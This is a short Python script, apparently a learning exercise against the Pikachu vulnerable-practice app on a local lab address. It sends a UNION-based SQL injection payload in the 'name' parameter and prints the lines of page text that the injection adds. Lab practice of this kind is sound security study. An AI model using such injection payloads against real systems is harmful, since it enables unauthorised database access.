import requests
from bs4 import BeautifulSoup
import difflib
url1 = "http://192.168.232.128/pikachu/vul/sqli/sqli_str.php"
url2 = "http://192.168.232.128/pikachu/vul/sqli/sqli_str.php?name=vince%27+union+select+1%2C2+%23&submit=%E6%9F%A5%E8%AF%A2"

# 使用 soup.get_text() 获取纯文本内容
response1 = requests.get(url1)
soup1 = BeautifulSoup(response1.text, 'html.parser')
content1 = set(soup1.get_text().splitlines())

response2 = requests.get(url2)
soup2 = BeautifulSoup(response2.text, 'html.parser')
content2 = set(soup2.get_text().splitlines())

# 找出 url2 有而 url1 没有的行并打印
for line in content2 - content1:
    print(line)
